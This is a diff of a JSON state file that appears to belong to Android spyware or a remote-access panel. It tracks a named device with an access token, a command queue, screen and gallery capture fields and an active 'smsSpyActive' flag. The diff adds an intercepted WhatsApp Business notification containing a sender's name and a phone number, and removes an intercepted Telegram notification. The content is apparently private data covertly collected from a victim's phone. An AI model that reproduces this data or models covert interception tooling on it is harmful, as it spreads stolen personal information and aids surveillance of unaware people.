@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775639215266,
+    "lastSeen": 1775639221143,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "‎JB || KHAFA X NAZRIEL (7 pesan): ~ HAMSKY STORE REAL",
+        "content": "+62 877-9429-3798",
+        "time": "08/04 16:07",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639223912
+      },
       {
         "appName": "Telegram",
         "sender": "ㅤ ᴀ̈xᴇʟʟ",
@@ -4310,14 +4318,6 @@
         "time": "08/04 15:17",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775636262382
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "15 new messages from 12 chats",
-        "time": "08/04 15:17",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636262106
       }
     ],
     "galleryPhotos": [],
